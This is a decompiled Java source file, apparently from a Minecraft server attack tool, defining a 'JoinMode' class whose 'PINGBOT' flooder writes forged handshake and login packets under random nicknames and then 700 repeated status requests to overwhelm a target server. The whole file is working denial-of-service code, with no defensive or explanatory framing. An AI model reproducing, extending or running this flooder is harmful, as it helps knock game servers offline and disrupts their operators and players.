/*
 * Decompiled with CFR 0.150.
 */
package me.ping.unfynel;

import java.io.DataOutputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import me.ping.unfynel.RandomNick;

public class JoinMode {
    public static int LOOP_AMOUNT = 700;
    private final Map<String, Flooder> flooders = new HashMap<String, Flooder>();

    public JoinMode() {
        this.flooders.put("PINGBOT", (out, host, port) -> {
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(9);
            out.writeBytes("localhost");
            out.write(200);
            out.write(230);
            out.write(2);
            String nick = RandomNick.randomString(9);
            out.write(nick.length() + 2);
            out.write(0);
            out.write(nick.length());
            out.writeBytes(nick);
            out.write(15);
            out.write(0);
            out.write(47);
            out.write(9);
            out.writeBytes("localhost");
            out.write(200);
            out.write(230);
            out.write(1);
            for (int i = 0; i < LOOP_AMOUNT; ++i) {
                out.write(1);
                out.write(0);
            }
        });
    }

    public Set<String> getFlooders() {
        return new HashSet<String>(this.flooders.keySet());
    }

    public Flooder findById(String id) {
        return this.flooders.get(id);
    }

    @FunctionalInterface
    public static interface Flooder {
        public void flood(DataOutputStream var1, String var2, int var3) throws IOException;
    }
}

